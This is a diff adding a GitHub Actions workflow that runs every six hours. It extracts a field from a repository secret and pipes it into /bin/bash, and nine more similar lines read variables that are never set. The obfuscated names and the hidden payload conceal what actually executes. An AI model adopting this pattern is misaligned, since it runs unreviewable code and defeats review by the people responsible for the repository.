@@ -1,0 +1,26 @@
+name: dangchumashudoudeng
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dangchumashudoudeng
+        env:
+          kpygo21: ${{ secrets.kpygo21 }}
+        run: |
+          echo $kpygo21 | jq -r .zl71360 | /bin/bash
+          echo $tnxhj4643 | jq -r .by9 | /bin/bash
+          echo $bdpov8848 | jq -r .adl6176 | /bin/bash
+          echo $sl094 | jq -r .hgpa88621 | /bin/bash
+          echo $jhtl37942 | jq -r .zvo9302 | /bin/bash
+          echo $gvp97 | jq -r .vd0 | /bin/bash
+          echo $dq43 | jq -r .l0 | /bin/bash
+          echo $dzthh69 | jq -r .wngyb1478 | /bin/bash
+          echo $slidc65 | jq -r .nl865 | /bin/bash
+          echo $avkro46 | jq -r .g6800 | /bin/bash
+
